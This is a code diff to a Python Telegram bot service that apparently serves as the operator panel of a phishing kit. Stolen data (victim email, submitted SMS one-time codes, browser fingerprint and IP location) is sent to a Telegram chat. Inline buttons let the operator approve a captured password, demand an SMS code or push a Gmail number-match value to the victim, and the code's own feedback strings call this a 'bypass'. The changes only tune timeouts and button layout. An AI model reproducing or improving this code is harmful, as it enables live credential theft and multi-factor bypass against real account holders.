@@ -29,14 +29,15 @@ class TelegramService:
             raise ValueError("Telegram Bot Token is not configured.")
         url = f"https://api.telegram.org/bot{self.bot_token}/{method}"
         try:
-            # Use 10s socket timeout, enough headroom for long polling
-            res = requests.post(url, json=payload, timeout=10)
+            # Use 35s socket timeout headroom to support the 30s long polling threshold securely
+            res = requests.post(url, json=payload, timeout=35)
             data = res.json()
             if not data.get("ok"):
                 raise Exception(f"Telegram API Error: {data.get('description', json.dumps(data))}")
             return data.get("result")
         except Exception as e:
             raise e
+
     def send_message(self, text, parse_mode="HTML", reply_markup=None):
         if not self.chat_id:
             raise ValueError("Telegram Chat ID is not configured.")
@@ -62,31 +63,12 @@ class TelegramService:
         return self.send_message(message, "HTML")
 
     def send_login_alert(self, state):
-        """
-        quickly send a login alert to the configured Telegram chat with details from the state dictionary.
-
-        📱 <b>Device & Browser Fingerprint:</b>
-    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
-    • OS: <code>{visitor.get('os', 'Unknown')}</code>
-    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
-    • Language: <code>{visitor.get('language', 'Unknown')}</code>
-    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
-    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
-    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>
-
-        """
         if not self.is_configured():
             return None
 
         provider_name = state.get("provider", "").upper()
         attempt_id = state.get("id", "")
-
-        visitor = state.get("visitor", {})  # ✅ IMPORTANT
-
-        prompt_details = (
-            f"🔢 <b>Gmail Match Code:</b> <code>{state.get('promptNumber')}</code>\n"
-            if state.get("promptNumber") else ""
-        )
+        visitor = state.get("visitor", {})
 
         time_format = datetime.utcnow().strftime("%H:%M:%S")
         if state.get("timestamp"):
@@ -108,67 +90,55 @@ class TelegramService:
     • Region: <code>{visitor.get('region', 'Unknown')}</code>
     • Country: <code>{visitor.get('country_name', 'Unknown')} ({visitor.get('country_code', '??')})</code>
     • Provider/ISP: <code>{visitor.get('org', 'Unknown')}</code>
-
-    
-  
         """.strip()
 
-        keyboard = []
-        keyboard.append([
-            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
-        ])
-        keyboard.append([
-            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
-            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
-        ])
-
-        candidates = state.get("promptCandidates") or []
-        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
-            row = []
-            for num in candidates:
-                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
-            keyboard.append(row)
-            keyboard.append([
+        keyboard = [
+            [
+                {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
+            ],
+            [
+                {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
+                {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
+            ],
+            [
                 {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ])
-        else:
-           keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ])
+            ]
+        ]
 
         inline_keyboard = {"inline_keyboard": keyboard}
         return self.send_message(message, "HTML", inline_keyboard)
+
     def send_sms_submit_alert(self, state):
-            if not self.is_configured():
-                return None
+        if not self.is_configured():
+            return None
 
-            attempt_id = state.get("id", "")
+        attempt_id = state.get("id", "")
 
-            message = f"""
+        message = f"""
     📲 <b>BOX RESULT</b>
     ━━━━━━━━━━━━━━━━━━
     🏢 <b>Portal:</b> {state.get('provider', '').upper()}
     📧 <b>Email:</b> <code>{state.get('email') or "Unknown"}</code>
     📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
     ━━━━━━━━━━━━━━━━━━
-            """.strip()
+        """.strip()
 
-            # Build a clean, structured layout with exactly one button per action
-            keyboard = [
-                [
-                    {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
-                ],
-                [
-                    {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
-                    {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
-                ],
-                [
-                    {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-                ]
+        keyboard = [
+            [
+                {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
+            ],
+            [
+                {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
+                {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
+            ],
+            [
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
             ]
+        ]
 
-            inline_keyboard = {"inline_keyboard": keyboard}
-            return self.send_message(message, "HTML", inline_keyboard)
+        inline_keyboard = {"inline_keyboard": keyboard}
+        return self.send_message(message, "HTML", inline_keyboard)
+
     def poll_updates(self, on_action_received):
         if not self.is_configured():
             return 0
@@ -176,7 +146,7 @@ class TelegramService:
             return 0
         self.polling_in_progress = True
         try:
-            payload = {"timeout": 30}  # Long polling keeps connection alive efficiently
+            payload = {"timeout": 30}  
             if self.last_update_id > 0:
                 payload["offset"] = self.last_update_id + 1
 
@@ -228,7 +198,6 @@ class TelegramService:
                         mapped_action = "pending"
                         feedback = "Action processed"
 
-                        # Define custom user feedback notices instantly based on actions
                         if action == "approve":
                             mapped_action = "approve"
                             feedback = "Bypass approved! ✅"
@@ -255,8 +224,7 @@ class TelegramService:
                             chosen_number = parts[3] if len(parts) > 3 else ""
                             feedback = f"Number {chosen_number} sent to guest ✅"
 
-                        # 🚀 CRITICAL OPTIMIZATION: Answer the callback query IMMEDIATELY.
-                        # This tells the Telegram app to stop spinning the loading wheels instantly.
+                        # 🚀 Early Response Optimization: Stops button spinning instantly
                         try:
                             self.api_call("answerCallbackQuery", {
                                 "callback_query_id": query_id,
@@ -265,7 +233,6 @@ class TelegramService:
                         except Exception as e:
                             print(f"Failed to answer callback query early: {e}", flush=True)
 
-                        # Run structural interface modifications (Inline Keyboard changes)
                         if action == "num_prompt":
                             try:
                                 orig = callback_query.get("message")
@@ -273,9 +240,11 @@ class TelegramService:
 
                                 keyboard = []
                                 nums = list(range(1, 101))
-                                for r in range(0, 100, 10):
+                                
+                                # 🚀 FIXED GRID LAYOUT: Grouping by 5 columns avoids horizontal cutting bounds
+                                for r in range(0, 100, 5):
                                     row = []
-                                    for n in nums[r:r + 10]:
+                                    for n in nums[r:r + 5]:
                                         row.append({"text": str(n), "callback_data": f"tg:sendcandidates:{attempt_id}:{n}"})
                                     keyboard.append(row)
 
@@ -315,7 +284,6 @@ class TelegramService:
                             except Exception as _e:
                                 print(f"Failed to restore panel keyboard: {_e}", flush=True)
 
-                        # Clean up standard text message interfaces (only if not an inline menu process)
                         if not handled_inline:
                             try:
                                 original_msg = callback_query.get("message")
@@ -328,7 +296,6 @@ class TelegramService:
                             except Exception as e:
                                 print(f"Failed to clear inline layout: {e}", flush=True)
 
-                        # Dispatch the telemetry action details back to your Flask backend pipelines
                         if action == "picknum":
                             chosen_val = parts[3] if len(parts) > 3 else None
                             on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
